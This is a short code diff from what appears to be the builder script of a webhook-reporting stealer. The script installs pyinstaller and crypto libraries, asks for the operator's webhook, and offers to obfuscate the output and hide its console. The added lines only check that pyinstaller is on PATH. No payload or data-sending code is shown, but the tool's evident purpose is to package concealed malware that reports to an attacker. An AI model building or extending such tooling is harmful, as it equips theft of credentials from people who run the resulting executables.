@@ -16,6 +16,10 @@ if "is not recognized" in subprocess.check_output("python --version").decode():
 os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests")
 os.system("cls")
 
+if "is not recognized" in subprocess.check_output("pyinstaller --version").decode():
+    print("Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!")
+    while True: pass
+
 webhook = input("Paste your Webhook: ")
 obfuscate = input("Obfuscate (Encrypt) the code? (Y/N): ")
 console = input("Show the Console when running? (Y/N): ")
